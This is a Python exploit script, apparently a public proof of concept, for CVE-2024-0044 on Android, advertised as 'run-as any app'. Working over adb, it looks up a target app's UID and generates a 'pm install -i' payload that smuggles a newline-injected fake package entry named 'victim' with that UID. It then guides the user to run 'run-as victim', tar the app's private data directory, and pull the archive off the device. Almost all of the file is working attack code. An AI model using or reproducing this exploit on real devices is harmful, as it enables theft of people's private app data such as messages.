import argparse
import subprocess, os

GREEN = "\033[32m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"
CHECK_MARK = "\u2714"
ERROR_MARK = "\u2716"

class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawDescriptionHelpFormatter):
    pass

def display_banner():
    print(f'''{GREEN}                                                                               
##########################################################################################
###############S%%#####################################################%%S################
###############%++*S##################################################?++?################
################%++*S###############################################S*++?#################
#################%+++%#############################################S*++%##################
##################S*++%###########################################%+++%###################
###################S*++?#########SSS%%?????***?????%%%SS#########%++*S####################
#####################?++*##S%%?**+++++++++++++++++++++++**??%S##?++*S#####################
######################?++**+++++++++++++++++++++++++++++++++++**++*#######################
###################S%?*++++++++++++++++++++++++++++++++++++++++++++?%S####################
#################%?+++++++++++++++++++++++++++++++++++++++++++++++++++*%S#################
##############S?+++++++++++++++++++++++++++++++++++++++++++++++++++++++++?S###############
############S?+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*S#############
##########S?+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*S###########
#########%+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++?##########
#######S*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*S########
######%++++++++++++++*%SS%?+++++++++++++++++++++++++++++++++++?%SS%*++++++++++++++%#######
#####%++++++++++++++*######%+++++++++++++++++++++++++++++++++%######?++++++++++++++?######
####?+++++++++++++++*######S+++++++++++++++++++++++++++++++++%######?+++++++++++++++?#####
###%+++++++++++++++++*%SS%?+++++++++++++++++++++++++++++++++++?%SS%*+++++++++++++++++?####
##S+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%###
##*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++S##
#%+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++?##
#*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++S#
S+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++%#      
        {CYAN}''')

parser = argparse.ArgumentParser(
    description='CVE-2024-0044: run-as any app @Pl4int3xt',
    formatter_class=CustomFormatter,
    epilog= display_banner()
)
parser.add_argument("-P", help="package name", required=True)
parser.add_argument("-A", help="apk file path", required=True)
args = parser.parse_args()

package_name = args.P
apk_path = args.A

create_extraction_directory_commands = [
    "mkdir /data/local/tmp/wa/",
    "touch /data/local/tmp/wa/wa.tar",
    "chmod -R 0777 /data/local/tmp/wa/"
]

adb_path = 'adb'
remote_file_path = '/data/local/tmp/wa/wa.tar'
local_file_path = './wa.tar'

def push_apk(apk_path):
    try:
        if not os.path.isfile(apk_path):
            print(f"Error: APK file '{apk_path}' does not exist.")
            return False
        
        result = subprocess.run(['adb', 'push', apk_path, '/data/local/tmp/'], capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Error: {result.stderr.strip()}")
            return False

        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Successfully pushed '{GREEN}{apk_path}{CYAN}' to '{GREEN}/data/local/tmp/{os.path.basename(apk_path)}{CYAN}'")
        return True
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred: {e}")
        return False

def get_app_uid(package_name):
    try:
        result = subprocess.run(['adb', 'shell', f'pm list packages -U | grep {package_name}'], capture_output=True, text=True)
        
        if result.returncode != 0:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Error: {result.stderr.strip()}")
            return None

        for line in result.stdout.splitlines():
            if f'package:{package_name} uid:' in line:
                uid = line.split('uid:')[1].strip()
                print(f"{CYAN}{BOLD}[{CHECK_MARK}] Got the target uid for {GREEN}{package_name}{CYAN} : {GREEN}{uid}{CYAN}")
                return uid
        return None
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred: {e}")
        return None

def generate_payload(uid, apk_filename):
    try:
        payload = f"PAYLOAD=\"@null\nvictim {uid} 1 /data/user/0 default:targetSdkVersion=28 none 0 0 1 @null\"\npm install -i \"$PAYLOAD\" /data/local/tmp/{apk_filename}"
        with open('payload.txt', 'w') as f:
            f.write(payload)
        print(f"{CYAN}{BOLD}[{CHECK_MARK}] Payload generated and saved to : {GREEN}'payload.txt'{CYAN}")
        print(f"{GREEN}{payload}{GREEN}")
        prompt_user_for_next_action()
    except Exception as e:
        print(f"{CYAN}{BOLD}[{ERROR_MARK}] An error occurred: {e}")

def prompt_user_for_next_action():
    while True:
        user_input = input(f"{CYAN}{BOLD}Copy the above command in adb shell. After you finish, type {GREEN}'y'{CYAN} to continue or {GREEN}'n'{CYAN} to quit: ").strip().lower()
        if user_input == 'y':
            run_adb_commands(create_extraction_directory_commands)
            break
        elif user_input == 'n':
            print("Exiting.")
            break
        else:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Invalid input. Please type 'y' to continue or 'n' to quit.")
            
def prompt_user_to_run_as():
    while True:
        print(f"{GREEN}run-as victim\ntar -cf /data/local/tmp/wa/wa.tar {package_name}{CYAN}")
        user_input = input(f"{CYAN}{BOLD}Copy the above commands in adb shell. Wait until the last command executes successfully. After you finish, type {GREEN}'y'{CYAN} to continue or {GREEN}'n'{CYAN} to quit: ").strip().lower()
        if user_input == 'y':
            pull_with_progress("wa.tar")
            break
        elif user_input == 'n':
            print("Exiting.")
            break
        else:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Invalid input. Please type 'y' to continue or 'n' to quit.")

def pull_with_progress(filename, device_path="/data/local/tmp/wa/wa.tar"):
    filesize = int(subprocess.check_output(["adb", "shell", "du -s", device_path]).split()[0])
    print(f"{CYAN}{BOLD}[{CHECK_MARK}] Downloading file: {GREEN}{filename}{CYAN} (size: {GREEN}{filesize}{CYAN} bytes)")

    with open(filename, "wb") as f:
        process = subprocess.Popen(["adb", "shell", "cat", device_path], stdout=subprocess.PIPE)
        received = 0
        total_bars = 20
        while True:
            data = process.stdout.read(1024)
            if not data:
                break
            received += len(data)
            f.write(data)
            percent = int((received / filesize) * 100)
            print(f"Progress:{GREEN}{percent}{CYAN}", end="\r")

    print(f"\n{CYAN}{BOLD}[{CHECK_MARK}] Download complete: {GREEN}{filename}{CYAN}")


def run_adb_commands(commands):
    for command in commands:
        full_command = f"adb shell {command}"
        try:
            result = subprocess.run(full_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"{CYAN}{BOLD}[{CHECK_MARK}] Command {GREEN}'{command}'{CYAN} executed successfully: {result.stdout.decode().strip()}")
        except subprocess.CalledProcessError as e:
            print(f"{CYAN}{BOLD}[{ERROR_MARK}] Error executing command {GREEN}'{command}'{CYAN}: {e.stderr.decode().strip()}")
            
    prompt_user_to_run_as()
    
if __name__ == "__main__":
    try:
        if apk_path.endswith('.apk'):
            success = push_apk(apk_path)
            if success:
                apk_filename = os.path.basename(apk_path)
                uid = get_app_uid(package_name)
                if uid:
                    generate_payload(uid, apk_filename)
                else:
                    print(f"Could not find UID for the package {package_name}")
            else:
                print(f"Failed to push the APK '{apk_path}'.")
                
    except argparse.ArgumentError:
        parser.print_help()